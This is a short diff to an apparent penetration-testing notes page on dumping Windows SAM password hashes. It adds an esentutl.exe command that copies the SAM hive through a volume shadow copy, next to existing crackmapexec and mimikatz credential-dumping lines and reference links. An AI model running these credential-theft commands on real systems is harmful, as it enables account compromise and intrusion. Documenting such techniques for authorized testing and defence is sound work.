@@ -23,6 +23,14 @@ crackmapexec smb $ip -u $username -p $password --sam
 mimikatz lsadump::sam    
 ```
 
+It is also possible to [dump the SAM file via esentutl.exe](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-sam-via-esentutl.exe) which comes installed by default with Windows:
+
+```bash
+esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam
+```
+
 ### References
 
 {% embed url="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-hashes-from-sam-registry" %}
+
+{% embed url="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-sam-via-esentutl.exe" %}
